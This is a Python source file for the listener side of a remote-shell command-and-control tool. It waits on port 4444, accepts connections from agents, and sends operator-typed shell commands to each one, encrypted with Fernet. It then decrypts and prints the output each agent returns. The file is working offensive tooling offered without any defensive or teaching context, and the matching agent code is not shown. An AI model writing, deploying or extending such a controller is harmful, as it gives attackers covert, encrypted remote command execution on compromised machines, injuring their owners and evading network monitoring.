import socket
import threading
from cryptography.fernet import Fernet

# Generate a key for encryption/decryption
# In a real scenario, this key would be securely exchanged or derived
KEY = Fernet.generate_key()
f = Fernet(KEY)

def handle_client(client_socket, addr):
    print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
    try:
        while True:
            # Send command to client
            command = input(f"shell@{addr[0]}:{addr[1]} > ")
            if command.lower() == 'exit':
                break
            
            encrypted_command = f.encrypt(command.encode())
            client_socket.send(encrypted_command)

            # Receive output from client
            encrypted_output = client_socket.recv(4096)
            output = f.decrypt(encrypted_output).decode()
            print(output)
    except Exception as e:
        print(f"[-] Error handling client {addr}: {e}")
    finally:
        print(f"[*] Client {addr} disconnected.")
        client_socket.close()

def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")
    print(f"[*] Encryption Key: {KEY.decode()}") # Display key for agent to use

    while True:
        client_socket, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    HOST = '0.0.0.0'
    PORT = 4444
    start_server(HOST, PORT)
